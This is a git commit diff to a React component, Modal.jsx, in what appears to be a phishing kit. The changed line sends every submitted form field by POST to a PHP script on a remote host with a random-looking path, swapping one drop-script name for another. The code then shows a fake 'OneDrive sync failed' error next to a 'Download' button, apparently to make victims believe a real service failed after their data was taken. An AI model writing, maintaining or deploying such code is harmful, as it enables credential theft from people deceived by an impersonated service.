2cbb6eece4e8edf222e8294edd5a754268ccc36b
justinkane129 <119983608+justinkane129@users.noreply.github.com>
2023-04-27 02:09:14 +0100

    fd

--- src/components/Modal.jsx
+++ src/components/Modal.jsx
@@ -34,7 +34,7 @@ const Modal = ({ toggle, open }) => {
     const formData = new FormData();
     Object.entries(values).forEach(([k, v]) => formData.append(k, v));
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/yungwealthh.php", true);
+    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/giniyayoo.php", true);
     xhr.onload = () => {
         setMessage("Error: OneDrive sync failed. Please try again.");
         subBtn.current.innerHTML = "Download"
